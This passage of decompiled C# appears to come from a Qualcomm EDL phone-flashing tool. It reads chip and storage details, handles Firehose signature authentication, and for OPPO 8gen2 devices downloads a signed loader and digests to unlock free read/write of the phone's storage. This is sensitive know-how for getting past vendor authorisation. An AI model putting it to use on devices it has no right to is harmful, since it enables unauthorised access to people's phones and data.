						((StructHelper)_36).Dword(false);
						uint num5 = ((StructHelper)_36).Dword(false);
						object obj5 = new CommandHelper();
						((CommandHelper)obj5).Dword(15u);
						((CommandHelper)obj5).Dword(12u);
						((CommandHelper)obj5).Dword(2u);
						obj = ((CommandHelper)obj5).GetCmd();
						((SerialPort)Form1.m_35).Write((byte[])obj, 0, ((Array)obj).Length);
						Thread.Sleep(10);
						obj = new byte[num5];
						((SerialPort)Form1.m_35).Read((byte[])obj, 0, ((Array)obj).Length);
						_36 = new StructHelper((byte[])obj);
						ulong num6 = ((((Array)obj).Length < 8) ? ((StructHelper)_36).Dword(false) : ((StructHelper)_36).Qword(false));
						object obj6 = $"{num6:x16}";
						Msg("       MSM_ID: ");
						object hexStr = ((string)obj6).Substring(2, 6);
						object socNameFromHex = VendorResolver.GetSocNameFromHex((string)hexStr);
						fa();
						Msg((string)socNameFromHex + "\n");
						Msg("       Vendor: ");
						object hexCode = ((string)obj6).Substring(((string)obj6).Length - 8, 4);
						object vendorName = VendorResolver.GetVendorName((string)hexCode);
						fa();
						Msg((string)vendorName + "\n");
						object obj7 = new CommandHelper();
						((CommandHelper)obj7).Dword(13u);
						((CommandHelper)obj7).Dword(12u);
						((CommandHelper)obj7).Dword(1u);
						obj = ((CommandHelper)obj7).GetCmd();
						((SerialPort)Form1.m_35).Write((byte[])obj, 0, ((Array)obj).Length);
						Thread.Sleep(10);
						obj = new byte[((SerialPort)Form1.m_35).BytesToRead];
						((SerialPort)Form1.m_35).Read((byte[])obj, 0, ((Array)obj).Length);
						_36 = new StructHelper((byte[])obj);
						num2 = ((StructHelper)_36).Dword(false);
						if (num2 != 14)
						{
							msgred();
							Msg("Error\n");
							return 0;
						}
						_36 = new StructHelper((byte[])obj);
						((StructHelper)_36).Dword(false);
						((StructHelper)_36).Dword(false);
						((StructHelper)_36).Dword(false);
						uint num7 = ((StructHelper)_36).Dword(false);
						object obj8 = new CommandHelper();
						((CommandHelper)obj8).Dword(15u);
						((CommandHelper)obj8).Dword(12u);
						((CommandHelper)obj8).Dword(1u);
						obj = ((CommandHelper)obj8).GetCmd();
						((SerialPort)Form1.m_35).Write((byte[])obj, 0, ((Array)obj).Length);
						Thread.Sleep(10);
						obj = new byte[num7];
						((SerialPort)Form1.m_35).Read((byte[])obj, 0, ((Array)obj).Length);
						_36 = new StructHelper((byte[])obj);
						ulong num8 = ((((Array)obj).Length < 8) ? ((StructHelper)_36).Dword(false) : ((StructHelper)_36).Qword(false));
						object obj9 = $"{num8:x8}";
						Msg("       Cpu_id: ");
						fa();
						Msg((string)obj9 + "\n");
						object obj10 = new CommandHelper();
						((CommandHelper)obj10).Dword(13u);
						((CommandHelper)obj10).Dword(12u);
						((CommandHelper)obj10).Dword(3u);
						obj = ((CommandHelper)obj10).GetCmd();
						((SerialPort)Form1.m_35).Write((byte[])obj, 0, ((Array)obj).Length);
						Thread.Sleep(10);
						obj = new byte[((SerialPort)Form1.m_35).BytesToRead];
						((SerialPort)Form1.m_35).Read((byte[])obj, 0, ((Array)obj).Length);
						_36 = new StructHelper((byte[])obj);
						num2 = ((StructHelper)_36).Dword(false);
						if (num2 != 14)
						{
							Msg("error");
							return 0;
						}
						_36 = new StructHelper((byte[])obj);
						((StructHelper)_36).Dword(false);
						((StructHelper)_36).Dword(false);
						((StructHelper)_36).Dword(false);
						uint num9 = ((StructHelper)_36).Dword(false);
						object obj11 = new CommandHelper();
						((CommandHelper)obj11).Dword(15u);
						((CommandHelper)obj11).Dword(12u);
						((CommandHelper)obj11).Dword(3u);
						obj = ((CommandHelper)obj11).GetCmd();
						((SerialPort)Form1.m_35).Write((byte[])obj, 0, ((Array)obj).Length);
						Thread.Sleep(10);
						obj = new byte[num9];
						((SerialPort)Form1.m_35).Read((byte[])obj, 0, ((Array)obj).Length);
						nint num10 = (int)_27(obj, 4u, ((IEnumerable<byte>)obj).Take(4).ToArray());
						if (num10 != -1)
						{
							obj = ((IEnumerable<byte>)obj).Take((int)(4 + num10)).ToArray();
						}
						object obj12 = BitConverter.ToString((byte[])obj).Replace("-", "").ToLower();
						while (((string)obj12).EndsWith("00"))
						{
							obj12 = ((string)obj12).Substring(0, ((string)obj12).Length - 2);
						}
						object obj13 = obj12;
						Msg("OEM_HASH:");
						fa();
						Msg((string)obj13 + "\n");
						object obj14 = new CommandHelper();
						((CommandHelper)obj14).Dword(12u);
						((CommandHelper)obj14).Dword(12u);
						((CommandHelper)obj14).Dword(3u);
						obj = ((CommandHelper)obj14).GetCmd();
						((SerialPort)Form1.m_35).Write((byte[])obj, 0, ((Array)obj).Length);
						((SerialPort)Form1.m_35).Close();
						break;
					}
					return 1;
				}
				case 4u:
					Msg("Error\n");
					return 0;
				}
				return 1;
			}
			if (Encoding.UTF8.GetString((byte[])obj).IndexOf("<?xml") > -1)
			{
				fa();
				Msg("FIREHOSE");
				return 2;
			}
			msgred();
			Msg("Error\n");
			return 0;
		}
		catch (Exception)
		{
			msgred();
			Msg("Error\n");
			return 0;
		}
		finally
		{
			((SerialPort)Form1.m_35)?.Close();
		}
	}

	private async Task _29()
	{
		Msg("Read storage info...\n");
		object obj = string.Empty;
		object obj2 = new SerialPort(((Control)this.m_126).Text, 9600);
		try
		{
			try
			{
				((SerialPort)obj2).Open();
			}
			catch
			{
				msgred();
				Log2("端口占用", Color.Red, isBold: false);
				EnableButtons();
				return;
			}
			object xml = string.Format(Firehose.GETSTORAGEINFO);
			obj = await LinQcPortClass.xmlinfo((SerialPort)obj2, (string)xml);
			((SerialPort)obj2).Close();
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
		if (((string)obj).Contains("ACK"))
		{
			ParseUFSInfo((string)obj, this);
		}
		else
		{
			Msg("存储器配置错误！\n");
		}
	}

	public static void ParseUFSInfo(string xmlResponse, Form1 formInstance)
	{
		try
		{
			string input = WebUtility.HtmlDecode(xmlResponse);
			Match match = Regex.Match(input, "\"storage_info\"\\s*:\\s*(\\{.*?\\})");
			if (!match.Success)
			{
				formInstance.Msg("未找到 storage_info 信息");
				return;
			}
			string value = match.Groups[1].Value;
			Dictionary<string, JsonElement> dictionary = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(value);
			StringBuilder stringBuilder = new StringBuilder();
			if (dictionary.TryGetValue("prod_name", out var value2))
			{
				stringBuilder.AppendLine("     Product Name: " + value2.GetString());
			}
			if (dictionary.TryGetValue("serial_num", out var value3))
			{
				stringBuilder.AppendLine($"     Serial Number: 0x{value3.GetUInt32():X}");
			}
			if (dictionary.TryGetValue("manufacturer_id", out var value4))
			{
				stringBuilder.AppendLine($"     Manufacturer ID: 0x{value4.GetInt32():X}");
			}
			if (dictionary.TryGetValue("mem_type", out var value5))
			{
				stringBuilder.AppendLine("     Memory Type: " + value5.GetString());
			}
			if (dictionary.TryGetValue("fw_version", out var value6))
			{
				stringBuilder.AppendLine("     Firmware Version: " + value6.GetString());
			}
			formInstance.Msg(stringBuilder.ToString());
		}
		catch (Exception ex)
		{
			formInstance.Msg("解析失败：" + ex.Message);
		}
	}

	private async void _2b(object sig)
	{
		if (lang == "zh")
		{
			Log2("配置设备...", Color.Black, isBold: false, newline: true);
		}
		else
		{
			Log2("Reading configuration...", Color.Black, isBold: false, newline: true);
		}
		nint num = -2;
		object obj = new _003C_003Ec__DisplayClass98_0();
		((_003C_003Ec__DisplayClass98_0)obj).SepSl = new SerialPort(PortQcom, 9600);
		try
		{
			object CS_0024_003C_003E8__locals6 = new _003C_003Ec__DisplayClass98_1();
			((_003C_003Ec__DisplayClass98_1)CS_0024_003C_003E8__locals6).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass98_0)obj;
			try
			{
				((_003C_003Ec__DisplayClass98_1)CS_0024_003C_003E8__locals6).CS_0024_003C_003E8__locals1.SepSl.Open();
			}
			catch
			{
				msgred();
				Log2("端口占用，请解除其他刷机工具占用", Color.Red, isBold: false);
				EnableButtons();
				return;
			}
			object memName = (((UIRadioButton)this.m_d9).Checked ? "emmc" : "ufs");
			((_003C_003Ec__DisplayClass98_1)CS_0024_003C_003E8__locals6).xml = firehose_pkts.pkt_fhConfig1((string)memName);
			nint num2 = await Task.Run(() => LinQcPortClass.SendCon(((_003C_003Ec__DisplayClass98_1)CS_0024_003C_003E8__locals6).CS_0024_003C_003E8__locals1.SepSl, ((_003C_003Ec__DisplayClass98_1)CS_0024_003C_003E8__locals6).xml));
			num = num2;
			((_003C_003Ec__DisplayClass98_1)CS_0024_003C_003E8__locals6).CS_0024_003C_003E8__locals1.SepSl.Close();
		}
		finally
		{
			if (((_003C_003Ec__DisplayClass98_0)obj).SepSl != null)
			{
				((IDisposable)((_003C_003Ec__DisplayClass98_0)obj).SepSl).Dispose();
			}
		}
		int num3;
		switch ((long)num)
		{
		case 1L:
			msgred();
			if (lang == "zh")
			{
				Log2("需要认证", Color.Red, isBold: false);
				Log2("签名设备...", Color.Black, isBold: false, newline: true);
			}
			else
			{
				Log2("Authorization required", Color.Red, isBold: false);
				Log2("Authorized devices...", Color.Black, isBold: false, newline: true);
			}
			OpenDisk(PortQcom);
			if (_37(sig) != 0)
			{
				fa();
				Msg("OK\n");
				DiskClose();
				_1c1();
			}
			else
			{
				EnableButtons();
				DiskClose();
			}
			return;
		default:
			num3 = ((num == 4) ? 1 : 0);
			break;
		case 0L:
			num3 = 1;
			break;
		}
		if (num3 != 0)
		{
			fa();
			if (lang == "zh")
			{
				Msg("自由读写\n");
			}
			else
			{
				Msg("OK\n");
			}
			((Checkbox)this.m_109).Checked = true;
			EnableButtons();
			if (num == 4)
			{
				((UIRadioButton)this.m_d9).Checked = true;
			}
			_1c1();
		}
		else
		{
			msgred();
			Msg("Error\n");
			DiskClose();
			EnableButtons();
			msgred();
		}
	}

	private void _2e()
	{
		string port = PortQcom;
		vid = "1";
		Log2("读取签名... ", Color.Black, isBold: false, newline: true);
		SendXmlDISK(Firehose.REQ_AUTH);
		byte[] array = DiskRead("500");
		string respondXML = Encoding.UTF8.GetString(array, 0, array.Length);
		Log2("OK", Color.DodgerBlue, isBold: false);
		Log2("", Color.DodgerBlue, isBold: false, newline: true);
		DataAuth.BlobKey = (string)_2f(respondXML);
		string path = "C:\\TMFTool";
		string text = Path.Combine(path, "qcedlcmdhelper.exe");
		using (FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.Write))
		{
			byte[] qcedlcmdhelper = Resources.qcedlcmdhelper;
			fileStream.Write(qcedlcmdhelper, 0, qcedlcmdhelper.Length);
		}
		string sigValue = (string)_31(this.m_38);
		if (!string.IsNullOrEmpty(sigValue))
		{
			((Control)this).Invoke((Delegate)(Action)(() =>
			{
				Authe.SetPortValue(port);
				string username = (string)_24;
				Authe authe = new Authe(username, (string)this.m_25);
				authe.SetTextBoxValue(sigValue);
				((Control)(object)authe).Show();
			}));
		}
		else
		{
			EnableButtons();
			Log2("未能从 auth 中提取签名值", Color.Red, isBold: true);
		}
	}

	private object _2f(object respondXML)
	{
		List<XmlDocument> responseXml = GetResponseXml(waiteACK: false, (string)respondXML);
		int count = responseXml.Count;
		foreach (XmlDocument item in responseXml)
		{
			foreach (XmlElement childNode in item.SelectSingleNode("data").ChildNodes)
			{
				if (childNode.Name.ToLower() == "sig")
				{
					this.m_38 = childNode.OuterXml.Replace("blob", "sig");
				}
			}
		}
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.LoadXml((string)this.m_38);
		return xmlDocument.SelectSingleNode("sig").Attributes["value"].Value;
	}

	public List<XmlDocument> GetResponseXml(bool waiteACK, string xmlresp)
	{
		List<XmlDocument> list = new List<XmlDocument>();
		string[] array = (string[])_32(Encoding.UTF8.GetBytes(xmlresp), waiteACK ? 1u : 0u);
		if (array.Length >= 2)
		{
			foreach (string item in Regex.Split(array[1], "\\<\\?xml").ToList())
			{
				if (!string.IsNullOrEmpty(item))
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.LoadXml("<?xml " + item);
					list.Add(xmlDocument);
				}
			}
		}
		return list;
	}

	private object _31(object auth)
	{
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml((string)auth);
			XmlNode xmlNode = xmlDocument.SelectSingleNode("//sig");
			if (xmlNode != null)
			{
				return xmlNode.Attributes["value"]?.Value;
			}
			return string.Empty;
		}
		catch (Exception ex)
		{
			Log2("错误: " + ex.Message, Color.Red, isBold: true);
			return string.Empty;
		}
	}

	private object _32(object binary, uint waitACK)
	{
		if (binary == null)
		{
			return new string[2] { "", "" };
		}
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		StringBuilder stringBuilder3 = new StringBuilder();
		StringBuilder stringBuilder4 = new StringBuilder();
		for (int i = 0; i < ((Array)binary).Length; i++)
		{
			stringBuilder2.Append(Convert.ToChar(((byte[])binary)[i]).ToString());
		}
		return new string[2]
		{
			stringBuilder.ToString(),
			stringBuilder2.ToString()
		};
	}

	private void _33(object array3)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		try
		{
			if (!comm.IsOpen)
			{
				throw new Exception("port " + comm.serialPort.PortName + " is not open.");
			}
			if (lang == "zh")
			{
				Log2("连接引导...", Color.Black, isBold: false, newline: true);
			}
			else
			{
				Log2("Sahara Download Programmer...", Color.Black, isBold: false, newline: true);
			}
			sahara_switch_Mode_packet sahara_switch_Mode_packet2 = new sahara_switch_Mode_packet
			{
				Command = 19u,
				Length = 8u
			};
			byte[] array4 = new byte[12];
			comm.getRecDataIgnoreExcep();
			if (comm.recData == null || comm.recData.Length == 0)
			{
				comm.recData = new byte[48];
			}

			sahara_hello_packet sahara_hello_packet2 = (sahara_hello_packet)CommandFormat.BytesToStuct(comm.recData, typeof(sahara_hello_packet));
			sahara_hello_response sahara_hello_response2 = new sahara_hello_response
			{
				Reserved = new uint[6]
			};

			sahara_64b_readdata_packet sahara_64b_readdata_packet2 = default;


			string text = "Received hello packet";
			byte[] array5 = CommandFormat.StructToBytes(new sahara_hello_response
			{
				Reserved = new uint[6],
				Command = 2u,
				Length = 48u,
				Version = 2u,
				Version_min = 1u
			});
			comm.WritePort(array5, 0, array5.Length);
			if (((Array)array3).Length == 0)
			{
				Log2("Programmer file not found", Color.Red, isBold: true);
				stopwatch.Stop();
			}
			FileTransfer fileTransfer = new FileTransfer(comm.serialPort.PortName, (byte[])array3);
			bool flag;
			sahara_packet sahara_packet3;
			do
			{
				flag = false;
				comm.getRecData();
				byte[] recData = comm.recData;
				sahara_packet3 = (sahara_packet)CommandFormat.BytesToStuct(comm.recData, typeof(sahara_packet));
				switch (sahara_packet3.Command)
				{
				case 3u:
				{
					sahara_readdata_packet sahara_readdata_packet3 = (sahara_readdata_packet)CommandFormat.BytesToStuct(comm.recData, typeof(sahara_readdata_packet));
					text = $"[Sahara] Sending Loader 32 Bit data:imgID {sahara_readdata_packet3.Image_id}, offset {sahara_readdata_packet3.Offset},length {sahara_readdata_packet3.SLength}";
					fileTransfer.transfer(comm.serialPort, (int)sahara_readdata_packet3.Offset, (int)sahara_readdata_packet3.SLength);
					ProcessBar3(sahara_readdata_packet3.Offset, fileTransfer.fileLength, "Sahara Communications", stopwatch);
					break;
				}
				case 4u:
				{
					sahara_end_transfer_packet sahara_end_transfer_packet3 = (sahara_end_transfer_packet)CommandFormat.BytesToStuct(comm.recData, typeof(sahara_end_transfer_packet));
					text = $"[Sahara] Transfering END  imageID:{sahara_end_transfer_packet3.Image_id} status:{sahara_end_transfer_packet3.Status}";
					ProcessBar3((long)sahara_64b_readdata_packet2.Offset, fileTransfer.fileLength, "Sahara Communications Done", stopwatch);
					if (sahara_end_transfer_packet3.Status == 0)
					{
					}
					flag = true;
					break;
				}
				case 18u:
					sahara_64b_readdata_packet2 = (sahara_64b_readdata_packet)CommandFormat.BytesToStuct(comm.recData, typeof(sahara_64b_readdata_packet));
					text = "[Sahara] Sending Loader 64Bit of offset " + (string)_60((long)sahara_64b_readdata_packet2.Offset) + ",length " + (string)_60(fileTransfer.fileLength);
					fileTransfer.transfer(comm.serialPort, (int)sahara_64b_readdata_packet2.Offset, (int)sahara_64b_readdata_packet2.SLength);
					ProcessBar3((long)sahara_64b_readdata_packet2.Offset, fileTransfer.fileLength, "Sahara Communications", stopwatch);
					break;
				default:
					text = $"invalid command:{sahara_packet3.Command}";
					break;
				}
			}
			while (!flag);
			sahara_packet3.Command = 5u;
			sahara_packet3.Length = 8u;
			byte[] array6 = CommandFormat.StructToBytes(sahara_packet3, 8);
			for (int i = 8; i < array6.Length; i++)
			{
				array6[i] = 0;
			}
			comm.WritePort(array6, 0, array6.Length);
			comm.getRecData();
			if (comm.recData.Length == 0)
			{
				comm.recData = new byte[48];
			}
			sahara_done_response sahara_done_response3 = (sahara_done_response)CommandFormat.BytesToStuct(comm.recData, typeof(sahara_done_response));
			if (sahara_done_response3.Command != 6)
			{
				throw new Exception("programmer transfer error " + sahara_done_response3.Command);
			}
			Log2("OK", Color.DodgerBlue, isBold: true);
			stopwatch.Stop();
			fileTransfer.closeTransfer();
		}
		catch (Exception ex)
		{
			if (ex.Message.Contains("can not read from port"))
			{
				Log2("SAHARAR 读取错误!重新进入端口尝试", Color.Red, isBold: false);
			}
			else
			{
				Log2("Error", Color.Red, isBold: false);
			}
		}
		finally
		{
			_34(comm.serialPort);
			stopwatch.Stop();
		}
	}

	private void _34(object port)
	{
		if (port == null)
		{
			return;
		}
		try
		{
			if (((SerialPort)port).IsOpen)
			{
				((SerialPort)port).Close();
			}
		}
		catch
		{
		}
		try
		{
			Type typeFromHandle = typeof(SerialPort);
			Stream stream = (typeFromHandle.GetField("internalSerialStream", BindingFlags.Instance | BindingFlags.NonPublic) ?? typeFromHandle.GetField("serialStream", BindingFlags.Instance | BindingFlags.NonPublic))?.GetValue(port) as Stream;
			stream?.Close();
			stream?.Dispose();
		}
		catch (Exception ex)
		{
			Log2("强制关闭底层SerialStream失败：" + ex.Message, Color.Red, isBold: false);
		}
		try
		{
			((Component)port).Dispose();
		}
		catch (Exception ex2)
		{
			Log2("串口Dispose失败：" + ex2.Message, Color.Red, isBold: false);
		}
	}

	private uint _35(object port)
	{
		comm.serialPort = (SerialPort)port;
		if (comm.serialPort.IsOpen)
		{
			return 1u;
		}
		int num = 2;
		while (num-- > 0)
		{
			try
			{
				comm.serialPort.Open();
				return 1u;
			}
			catch (Exception)
			{
			}
		}
		return 0u;
	}

	public static string GetRight(string str, string s)
	{
		if (string.IsNullOrEmpty(str) || string.IsNullOrEmpty(s))
		{
			return str;
		}
		int num = str.IndexOf(s);
		if (num == -1 || num + s.Length >= str.Length)
		{
			return string.Empty;
		}
		return str.Substring(num + s.Length).Trim();
	}

	private uint _37(object hexKey)
	{
		try
		{
			List<byte> list = new List<byte>();
			for (int i = 0; i < ((string)hexKey).Length; i += 2)
			{
				string s = ((string)hexKey).Substring(i, 2);
				list.Add(byte.Parse(s, NumberStyles.AllowHexSpecifier));
			}
			byte[] array = list.ToArray();
			SendXmlDISK(string.Format(Firehose.AUTHP, array.Length));
			if (!IsAckDisk())
			{
				return 0u;
			}
			StringBuilder stringBuilder = new StringBuilder("Signature Data: ");
			byte[] array2 = array;
			foreach (byte b in array2)
			{
				stringBuilder.Append($"0x{b:X2} ");
			}
			Console.WriteLine(stringBuilder.ToString());
			DiskWrite(array);
			byte[] bytes = DiskRead("500");
			string text = Encoding.UTF8.GetString(bytes);
			return (!text.Contains("ERROR:")) ? 1u : 0u;
		}
		catch (Exception)
		{
			return 0u;
		}
	}

	private async Task<string> _38()
	{
		object obj = await _21();
		if (obj != null)
		{
			return "?encryptedRequest=" + (string)obj;
		}
		return string.Empty;
	}

	private async void _39()
	{
		object CS_0024_003C_003E8__locals5 = new _003C_003Ec__DisplayClass115_0();
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			MessageBox.Show("未找到9008端口", "提示", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		object path = "C:\\TMFTool";
		object filePath = Path.Combine((string)path, "conf.xml");
		object filePath2 = Path.Combine((string)path, "Digest.mbn");
		object filePath3 = Path.Combine((string)path, "OPPO8gen2.elf");
		object filePath4 = Path.Combine((string)path, "sig.dat");
		Msg("连接服务器...");
		object obj = this.m_25;
		await _111((string)obj + "/TMFTool/elf/OPPO8gen2/conf.xml" + await _38(), filePath);
		object obj2 = this.m_25;
		await _111((string)obj2 + "/TMFTool/elf/OPPO8gen2/Digest.mbn" + await _38(), filePath2);
		object obj3 = this.m_25;
		await _111((string)obj3 + "/TMFTool/elf/OPPO8gen2/OPPO8gen2.elf" + await _38(), filePath3);
		object obj4 = this.m_25;
		await _111((string)obj4 + "/TMFTool/elf/OPPO8gen2/sig.dat" + await _38(), filePath4);
		fa();
		Msg("OK\n");
		object obj5 = Path.Combine((string)path, "OPPO8gen2.elf");
		object fileName = Path.Combine((string)path, "QSaharaServer.exe");
		Path.Combine((string)path, "fh_loader.exe");
		object obj6 = Path.Combine((string)path, "Digest.mbn");
		object obj7 = Path.Combine((string)path, "conf.xml");
		object obj8 = Path.Combine((string)path, "sig.dat");
		if (!File.Exists((string)obj5) || !File.Exists((string)fileName))
		{
			MessageBox.Show("必要文件不存在", "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return;
		}
		object obj9 = ((Control)this.m_126).Text.Trim();
		if (string.IsNullOrEmpty((string)obj9))
		{
			MessageBox.Show("未识别到9008设备", "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return;
		}
		falseButtons();
		Msg("开始链接OPPO8gen2引导...");
		((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals5).logBuilder = new StringBuilder();
		object startInfo = new ProcessStartInfo
		{
			FileName = (string)fileName,
			Arguments = "-p \\\\.\\" + (string)obj9 + " -s 13:" + (string)obj5 + " -t 10",
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			UseShellExecute = false,
			CreateNoWindow = true
		};
		object obj10 = new Process();
		try
		{
			((Process)obj10).StartInfo = (ProcessStartInfo)startInfo;
			((Process)obj10).OutputDataReceived += (object s, DataReceivedEventArgs ev) =>
			{
				if (!string.IsNullOrEmpty(ev.Data))
				{
					((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals5).logBuilder.AppendLine(ev.Data);
				}
			};
			((Process)obj10).ErrorDataReceived += (object s, DataReceivedEventArgs ev) =>
			{
				if (!string.IsNullOrEmpty(ev.Data))
				{
					((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals5).logBuilder.AppendLine(ev.Data);
				}
			};
			((Process)obj10).Start();
			((Process)obj10).BeginOutputReadLine();
			((Process)obj10).BeginErrorReadLine();
			await ((Process)obj10).WaitForExitAsync();
			if (((Process)obj10).ExitCode == 0)
			{
				fa();
				Msg("OK\n");
				((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals5).logBuilder.AppendLine("OK");
				nint num = ((await _3b(obj9, "--signeddigests=" + (string)obj6 + " --noprompt --showpercentagecomplete --zlpawarehost=1 --memoryname=ufs --testvipimpact", "开始发送Digest指令", "发送Digest指令成功", "done", "发送Digest指令失败")) ? 1 : 0);
				IntPtr intPtr = num;
				if ((int)(nint)intPtr != 0)
				{
					nint num2 = ((await _3b(obj9, "--sendxml=" + (string)obj7, "开始发送NOP配置", "发送NOP配置成功", "done", "发送NOP配置失败")) ? 1 : 0);
					IntPtr intPtr2 = num2;
					if ((int)(nint)intPtr2 != 0)
					{
						nint num3 = ((await _3b(obj9, "--signeddigests=" + (string)obj8 + " --noprompt --showpercentagecomplete --zlpawarehost=1 --memoryname=ufs --testvipimpact", "开始写入签名", "串口通讯成功", "done", "串口通讯失败")) ? 1 : 0);
						IntPtr intPtr3 = num3;
						if ((int)(nint)intPtr3 != 0)
						{
							((Checkbox)this.m_109).Checked = true;
							EnableButtons();
							if (this.m_11 != null && this.m_11 != this.m_c9)
							{
								((Button)this.m_11).PerformClick();
								this.m_11 = null;
							}
							_3c(new string[4]
							{
								(string)obj5,
								(string)obj6,
								(string)obj7,
								(string)obj8
							});
						}
						else
						{
							msgred();
							Msg("Eroor\n");
						}
					}
				}
				EnableButtons();
			}
			else
			{
				msgred();
				Msg("Error\n");
				((_003C_003Ec__DisplayClass115_0)CS_0024_003C_003E8__locals5).logBuilder.AppendLine("Error");
				_3c(new string[4]
				{
					(string)obj5,
					(string)obj6,
					(string)obj7,
					(string)obj8
				});
				EnableButtons();
			}
		}
		finally
		{
			((IDisposable)obj10)?.Dispose();
		}
	}

	private void _3a(object text, Color color)
	{
		((TextBoxBase)this.m_c8).SelectionStart = ((TextBoxBase)this.m_c8).TextLength;
		((TextBoxBase)this.m_c8).SelectionLength = 0;
		((RichTextBox)this.m_c8).SelectionColor = color;
		((TextBoxBase)this.m_c8).AppendText((string)text);
		((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
	}

	private async Task<bool> _3b(object port, object arguments, object startMessage, object successMessage, object successKeyword, object failureMessage)
	{
		object CS_0024_003C_003E8__locals4 = new _003C_003Ec__DisplayClass117_0();
		_3a((string)startMessage + "\n", Color.Black);
		object fileName = Path.Combine("C:\\TMFTool", "fh_loader.exe");
		object startInfo = new ProcessStartInfo
		{
			FileName = (string)fileName,
			Arguments = "--port=\\\\.\\" + (string)port + " " + (string)arguments,
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			UseShellExecute = false,
			CreateNoWindow = true
		};
		((_003C_003Ec__DisplayClass117_0)CS_0024_003C_003E8__locals4).outputBuilder = new StringBuilder();
		object obj = new Process();
		try
		{
			((Process)obj).StartInfo = (ProcessStartInfo)startInfo;
			((Process)obj).OutputDataReceived += (object s, DataReceivedEventArgs ev) =>
			{
				if (!string.IsNullOrEmpty(ev.Data))
				{
					((_003C_003Ec__DisplayClass117_0)CS_0024_003C_003E8__locals4).outputBuilder.AppendLine(ev.Data);
				}
			};
			((Process)obj).ErrorDataReceived += (object s, DataReceivedEventArgs ev) =>
			{
				if (!string.IsNullOrEmpty(ev.Data))
				{
					((_003C_003Ec__DisplayClass117_0)CS_0024_003C_003E8__locals4).outputBuilder.AppendLine(ev.Data);
				}
			};
			((Process)obj).Start();
			((Process)obj).BeginOutputReadLine();
			((Process)obj).BeginErrorReadLine();
			await ((Process)obj).WaitForExitAsync();
			if (((_003C_003Ec__DisplayClass117_0)CS_0024_003C_003E8__locals4).outputBuilder.ToString().Contains((string)successKeyword))
			{
				_3a((string)successMessage + "\n", Color.DodgerBlue);
				return true;
			}
			_3a((string)failureMessage + "\n", Color.Red);
			return false;
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private void _3c(object filePaths)
	{
		for (int i = 0; i < ((Array)filePaths).Length; i++)
		{
			string text = (string)((object[])filePaths)[i];
			try
			{
				if (File.Exists(text))
				{
					File.Delete(text);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private void _3d(uint enabled)
	{
		((Control)this.m_c2).Enabled = (byte)enabled != 0;
		((Control)this.m_c9).Enabled = (byte)enabled != 0;
		((Control)this.m_ed).Enabled = (byte)enabled != 0;
		((Control)this.m_c6).Enabled = (byte)enabled != 0;
		((Control)this.m_cb).Enabled = (byte)enabled != 0;
		((Control)this.m_ec).Enabled = (byte)enabled != 0;
		((Control)_88).Enabled = (byte)enabled != 0;
		((Control)this.m_89).Enabled = (byte)enabled != 0;
		((Control)this.m_c2).Enabled = (byte)enabled != 0;
	}

	private void _3e(object filePaths)
	{
		for (int i = 0; i < ((Array)filePaths).Length; i++)
		{
			string text = (string)((object[])filePaths)[i];
			if (File.Exists(text))
			{
				File.Delete(text);
			}
		}
	}

	public void SetCheckBox2Checked(bool value)
	{
		((Checkbox)this.m_109).Checked = value;
	}

	public void Log2(string s, Color color, bool isBold, bool newline = false)
	{
		((Control)this).Invoke((Delegate)(Action)(() =>
		{
			if (newline && ((TextBoxBase)this.m_c8).TextLength > 0)
			{
				((TextBoxBase)this.m_c8).AppendText("\r\n");
			}
			((TextBoxBase)this.m_c8).SelectionStart = ((Control)this.m_c8).Text.Length;
			Color selectionColor = ((RichTextBox)this.m_c8).SelectionColor;
			Font selectionFont = ((RichTextBox)this.m_c8).SelectionFont;
			((RichTextBox)this.m_c8).SelectionColor = color;
			((TextBoxBase)this.m_c8).AppendText(s);
			((RichTextBox)this.m_c8).SelectionColor = selectionColor;
			((RichTextBox)this.m_c8).SelectionFont = selectionFont;
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}));
	}

	public string Getblob(string data)
	{
		if (data.IndexOf("ACK") == -1)
		{
			((TextBoxBase)this.m_c8).AppendText("读取失败,请检查是否被占用或重新进入9008再试！\n");
			return "error";
		}
		string[] array = data.Split(new string[1] { "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>" }, StringSplitOptions.RemoveEmptyEntries);
		string text = "";
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			MessageBox.Show(text2);
			string text3 = text2.Trim();
			string xml = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>" + text3;
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(xml);
			XmlNode xmlNode = xmlDocument.SelectSingleNode("//sig");
			if (xmlNode != null)
			{
				string value = xmlNode.Attributes["TargetName"].Value;
				string value2 = xmlNode.Attributes["value"].Value;
				text = value2;
				return value2;
			}
		}
		return "error";
	}

	private void _42()
	{
		this.m_39 = new System.Windows.Forms.Timer();
		((System.Windows.Forms.Timer)this.m_39).Interval = 1000;
		((System.Windows.Forms.Timer)this.m_39).Tick += _43;
		this.m_3a = (IntPtr)0;
	}

	private void _43(object sender, object e)
	{
		this.m_3a += (nint)1;
		int num = (int)((nint)this.m_3a / 60);
		int num2 = (int)((nint)this.m_3a % 60);
